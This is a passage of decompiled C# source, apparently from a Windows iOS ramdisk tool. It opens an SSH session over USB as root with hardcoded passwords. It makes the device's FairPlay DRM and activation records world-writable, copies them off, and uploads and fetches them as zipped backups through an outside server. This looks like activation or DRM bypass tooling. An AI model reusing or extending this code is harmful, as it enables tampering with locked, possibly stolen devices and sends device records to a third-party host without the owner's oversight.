			this.method_13("chmod 755 /mnt2/mobile/Library/FairPlay/");
		}
		catch
		{
			this.method_11();
		}
	}

	// Token: 0x0600003A RID: 58 RVA: 0x00007A80 File Offset: 0x00005C80
	private void method_11()
	{
		try
		{
			string text = Class20.string_2;
			this.method_13("chmod 755 /mnt2/mobile/Library/FairPlay");
			this.method_13("chmod -R 777 /mnt2/mobile/Library/FairPlay");
			this.method_13("chmod -R 777 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			this.method_13("chmod +x /mnt2/mobile/Library/FairPlay");
			this.scpClient_0.Download("/mnt2/mobile/Library/FairPlay", new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\FairPlay\\"));
			this.method_13("chmod 755 /mnt2/mobile/Library/FairPlay");
		}
		catch
		{
		}
	}

	// Token: 0x0600003B RID: 59 RVA: 0x00007B14 File Offset: 0x00005D14
	internal string method_12(string string_11)
	{
		bool flag = !this.sshClient_0.IsConnected;
		if (flag)
		{
			this.sshClient_0.ConnectionInfo.Timeout = TimeSpan.FromSeconds(15.0);
			this.sshClient_0.Connect();
		}
		string text;
		try
		{
			SshCommand sshCommand = this.sshClient_0.CreateCommand(string_11);
			sshCommand.CommandTimeout = TimeSpan.FromSeconds(30.0);
			sshCommand.Execute();
			bool bool_ = Class20.bool_0;
			if (bool_)
			{
				Console.WriteLine("=================");
				Console.WriteLine("Command Name = {0} " + sshCommand.CommandText);
				Console.WriteLine("Return Value = {0}", sshCommand.ExitStatus);
				Console.WriteLine("Lỗi = {0}", sshCommand.Error);
				Console.WriteLine("Result = {0}", sshCommand.Result);
			}
			text = sshCommand.Result;
		}
		catch
		{
			this.sshClient_0.Disconnect();
			text = null;
		}
		return text;
	}

	// Token: 0x0600003C RID: 60 RVA: 0x00007C24 File Offset: 0x00005E24
	public SshCommand method_13(string string_11)
	{
		bool flag = !this.sshClient_0.IsConnected;
		if (flag)
		{
			this.sshClient_0.ConnectionInfo.Timeout = TimeSpan.FromSeconds(15.0);
			this.sshClient_0.Connect();
		}
		SshCommand sshCommand2;
		try
		{
			SshCommand sshCommand = this.sshClient_0.CreateCommand(string_11);
			sshCommand.CommandTimeout = TimeSpan.FromSeconds(30.0);
			sshCommand.Execute();
			bool bool_ = Class20.bool_0;
			if (bool_)
			{
				Console.WriteLine("=================");
				Console.WriteLine("Command Name = {0} " + sshCommand.CommandText);
				Console.WriteLine("Return Value = {0}", sshCommand.ExitStatus);
				Console.WriteLine("Lỗi = {0}", sshCommand.Error);
				Console.WriteLine("Result = {0}", sshCommand.Result);
			}
			sshCommand2 = sshCommand;
		}
		catch
		{
			bool flag2 = !(string_11 == "ls") && !(string_11 == "uicache --all");
			if (flag2)
			{
				bool bool_2 = Class20.bool_0;
				if (bool_2)
				{
					Console.WriteLine("SSH Lỗi caused by: " + string_11);
				}
				else
				{
					Thread.Sleep(2000);
				}
				this.method_13(string_11);
			}
			sshCommand2 = null;
		}
		return sshCommand2;
	}

	// Token: 0x0600003D RID: 61 RVA: 0x00007D80 File Offset: 0x00005F80
	public void method_14()
	{
		bool flag = Class20.string_11 == "15";
		if (flag)
		{
			for (;;)
			{
				using (Process process = new Process())
				{
					process.StartInfo.FileName = Class21.string_1 + "\\files\\iproxy.exe";
					process.StartInfo.Arguments = this.int_0.ToString() + " 22";
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.RedirectStandardOutput = true;
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
				}
				try
				{
					this.method_15();
					break;
				}
				catch (Exception ex)
				{
					bool flag2 = MessageBox.Show("SSH Connection Lỗi. Try again.", "SSH Connection Lỗi", MessageBoxButtons.YesNo) != DialogResult.Yes;
					if (flag2)
					{
						throw new ApplicationException("Lỗi SSH " + ex.Message);
					}
				}
			}
		}
		else
		{
			bool flag3 = Class20.string_11 == "16";
			if (flag3)
			{
				for (;;)
				{
					using (Process process2 = new Process())
					{
						process2.StartInfo.FileName = Class21.string_1 + "\\files\\iproxy.exe";
						process2.StartInfo.Arguments = this.int_0.ToString() + " 86";
						process2.StartInfo.UseShellExecute = false;
						process2.StartInfo.RedirectStandardOutput = true;
						process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process2.StartInfo.CreateNoWindow = true;
						process2.Start();
					}
					try
					{
						this.method_16();
						break;
					}
					catch (Exception ex2)
					{
						bool flag4 = MessageBox.Show("SSH Connection Lỗi. Try again.", "SSH Connection Lỗi", MessageBoxButtons.YesNo) != DialogResult.Yes;
						if (flag4)
						{
							throw new ApplicationException("Lỗi SSH " + ex2.Message);
						}
					}
				}
			}
			else
			{
				bool flag5 = Class20.string_4.Contains("iPad");
				if (flag5)
				{
					for (;;)
					{
						this.method_17("86");
						try
						{
							this.method_16();
							break;
						}
						catch (Exception ex3)
						{
							bool flag6 = MessageBox.Show("SSH Connection Lỗi. Try again.", "SSH Connection Lỗi", MessageBoxButtons.YesNo) != DialogResult.Yes;
							if (flag6)
							{
								throw new ApplicationException("Lỗi SSH " + ex3.Message);
							}
						}
					}
				}
				else
				{
					for (;;)
					{
						this.method_17("22");
						try
						{
							this.method_15();
							break;
						}
						catch (Exception ex4)
						{
							bool flag7 = MessageBox.Show("SSH Connection Lỗi. Try again.", "SSH Connection Lỗi", MessageBoxButtons.YesNo) != DialogResult.Yes;
							if (flag7)
							{
								throw new ApplicationException("Lỗi SSH " + ex4.Message);
							}
						}
					}
				}
			}
		}
	}

	// Token: 0x0600003E RID: 62 RVA: 0x000080A0 File Offset: 0x000062A0
	public void method_15()
	{
		AuthenticationMethod[] array = new AuthenticationMethod[]
		{
			new PasswordAuthenticationMethod("root", "alpine")
		};
		ConnectionInfo connectionInfo = new ConnectionInfo(this.string_0, this.int_0, "root", array);
		connectionInfo.Timeout = TimeSpan.FromSeconds(20.0);
		this.sshClient_0 = new SshClient(connectionInfo);
		this.scpClient_0 = new ScpClient(connectionInfo);
		bool flag = !this.sshClient_0.IsConnected;
		if (flag)
		{
			this.sshClient_0.Connect();
		}
		bool flag2 = !this.scpClient_0.IsConnected;
		if (flag2)
		{
			this.scpClient_0.Connect();
		}
	}

	// Token: 0x0600003F RID: 63 RVA: 0x0000814C File Offset: 0x0000634C
	public void method_16()
	{
		AuthenticationMethod[] array = new AuthenticationMethod[]
		{
			new PasswordAuthenticationMethod("root", "TgRam2022")
		};
		ConnectionInfo connectionInfo = new ConnectionInfo(this.string_0, this.int_0, "root", array);
		connectionInfo.Timeout = TimeSpan.FromSeconds(20.0);
		this.sshClient_0 = new SshClient(connectionInfo);
		this.scpClient_0 = new ScpClient(connectionInfo);
		bool flag = !this.sshClient_0.IsConnected;
		if (flag)
		{
			this.sshClient_0.Connect();
		}
		bool flag2 = !this.scpClient_0.IsConnected;
		if (flag2)
		{
			this.scpClient_0.Connect();
		}
	}

	// Token: 0x06000040 RID: 64 RVA: 0x000081F8 File Offset: 0x000063F8
	public void method_17(string string_11)
	{
		using (Process process = new Process())
		{
			process.StartInfo.FileName = Class21.string_1 + "\\files\\iproxy.exe";
			process.StartInfo.Arguments = "2222 " + string_11;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
	}

	// Token: 0x06000041 RID: 65 RVA: 0x00008298 File Offset: 0x00006498
	public void method_18()
	{
		try
		{
			string text = Class21.string_3;
			string text2 = "POST";
			WebClient webClient = new WebClient();
			webClient.Credentials = CredentialCache.DefaultCredentials;
			webClient.UploadFile(text, text2, this.string_4 + Class20.string_2 + ".zip");
			webClient.Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Lỗi");
		}
	}

	// Token: 0x06000042 RID: 66 RVA: 0x00008314 File Offset: 0x00006514
	public void method_19()
	{
		bool flag = !Directory.Exists(Class21.string_1 + "\\Backups\\");
		if (flag)
		{
			Console.WriteLine("Directory Backup not found");
			Directory.CreateDirectory(Class21.string_1 + "\\Backups\\");
		}
		try
		{
			WebClient webClient = new WebClient();
			webClient.Credentials = CredentialCache.DefaultCredentials;
			webClient.DownloadFile(Class21.string_3 + "?download=" + Class20.string_2, Class21.string_1 + "\\Backups\\" + Class20.string_2 + ".zip");
			webClient.Dispose();
		}
		catch (Exception ex)
		{
			bool flag2 = ex.Message.Contains("404");
			if (flag2)
			{
				MessageBox.Show("Sorry backup file not Found in Server\nPlease Backup first!", "File Backup Not Found", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			else
			{
				MessageBox.Show(ex.Message, "Lỗi");
			}
		}
	}

	// Token: 0x06000043 RID: 67 RVA: 0x00008404 File Offset: 0x00006604
	public void method_20(int int_1, string string_11 = "")
	{
		Class21.Class22 @class = new Class21.Class22();
		@class.int_0 = int_1;
		@class.FRM_Onii_0 = (FRM_Onii)Application.OpenForms["FRM_Onii"];
		@class.FRM_Onii_0.Invoke(new MethodInvoker(@class.method_0));
		bool bool_ = Class20.bool_0;
		if (bool_)
		{
			Console.WriteLine(@class.int_0.ToString() + string_11);
		}
		@class.FRM_Onii_0.method_5(string_11);
	}

	// Token: 0x0400001D RID: 29
	private SshClient sshClient_0;

	// Token: 0x0400001E RID: 30
	private ScpClient scpClient_0;

	// Token: 0x0400001F RID: 31
	public string string_0 = "127.0.0.1";

	// Token: 0x04000020 RID: 32
	public int int_0 = 2222;

	// Token: 0x04000021 RID: 33
	public static string string_1 = Directory.GetCurrentDirectory();

	// Token: 0x04000022 RID: 34
	public static string string_2 = "\\Backups\\";

	// Token: 0x04000023 RID: 35
	public static string string_3 = "http://pentaboy.my.id/ramdisk/backup.php";

	// Token: 0x04000024 RID: 36
	private string string_4 = Class21.string_5 + Class21.string_2;

	// Token: 0x04000025 RID: 37
	public static string string_5 = Directory.GetCurrentDirectory();

	// Token: 0x04000026 RID: 38
	public static string string_6 = Class21.string_1 + "\\Backups\\";

	// Token: 0x04000027 RID: 39
	public static string string_7 = Class21.string_1 + "\\files\\utils\\";

	// Token: 0x04000028 RID: 40
	public static string string_8 = Class21.string_1 + "\\files\\utils.zip";

	// Token: 0x04000029 RID: 41
	public static string string_9 = Class21.string_1 + ".\\Cache\\";

	// Token: 0x0400002A RID: 42
	public string string_10 = "";

	// Token: 0x0200001B RID: 27
	[CompilerGenerated]
	private sealed class Class22
	{
		// Token: 0x060000FC RID: 252 RVA: 0x00010582 File Offset: 0x0000E782
		internal void method_0()
		{
			this.FRM_Onii_0.method_6(this.int_0, this.int_0.ToString());
		}

		// Token: 0x040000AF RID: 175
		public FRM_Onii FRM_Onii_0;

		// Token: 0x040000B0 RID: 176
		public int int_0;
	}
}
